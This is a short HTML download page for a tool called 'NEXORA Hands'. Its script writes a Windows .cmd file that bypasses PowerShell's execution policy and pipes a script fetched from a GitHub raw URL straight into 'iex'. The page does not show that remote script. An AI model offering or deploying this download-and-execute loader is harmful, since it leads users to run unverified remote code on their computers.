<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>NEXORA Hands</title>
</head>
<body>
  <h2>NEXORA Hands</h2>
  <p><button id="download">Download NEXORA Hands</button></p>
  <p>The button creates the actual <b>NEXORA-Hands.cmd</b> file in your Downloads folder.</p>
  <script>
    const cmd = `@echo off
setlocal
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/nexora-kz/NEXORA-Hands/main/remote.ps1 | iex"
if errorlevel 1 (
  echo.
  echo NEXORA Hands failed to start. Press any key to close.
  pause >nul
)
`;
    document.getElementById('download').addEventListener('click', () => {
      const blob = new Blob([cmd], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'NEXORA-Hands.cmd';
      document.body.appendChild(a);
      a.click();
      a.remove();
      setTimeout(() => URL.revokeObjectURL(url), 1000);
    });
  </script>
</body>
</html>
